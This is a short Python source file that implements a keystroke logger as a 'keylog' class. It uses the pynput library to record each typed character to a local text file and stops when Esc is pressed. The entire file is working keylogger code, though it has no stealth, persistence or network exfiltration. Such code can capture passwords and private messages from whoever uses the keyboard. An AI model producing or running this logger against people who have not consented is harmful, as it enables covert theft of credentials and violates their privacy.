from pynput import keyboard

class keylog:
    """
    Class used for keylogging.
    
    ...

    Attributes
    ----------
    outfileName : str
        the name of the output file. 
    
    Methods
    -------
    on_press(key)
        method writes to the output file when key is pressed. 

    on_release(key)
        method does necessary actions upon key release. 
    """
    def __init__(self, outfileName: str = "out.txt"):
        """
        Sets up the keylogger listener.

        outfileName : str
            the name of the output file. 
        """
        self.outfile  = open(outfileName, "w")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self, key: keyboard.Key):
        """
        Does necessary opperations for when a key is pressed. 

        key : keyboard.Key
            the key pressed.
        """
        try:
            self.outfile.write(key.char)

        #exception occurs when a special character is pressed. 
        except AttributeError:
            pass

    def on_release(self, key: keyboard.Key):
        """
        Does necessary opperations for when a key is released. 

        key : keyboard.Key
            the key released.
        """
        
        #close the outfile and exit this program when finished
        if key == keyboard.Key.esc:
            self.outfile.close()
            return False
        elif key == keyboard.Key.enter:
            self.outfile.write("\n")
        elif key == keyboard.Key.tab:
            self.outfile.write("\t")



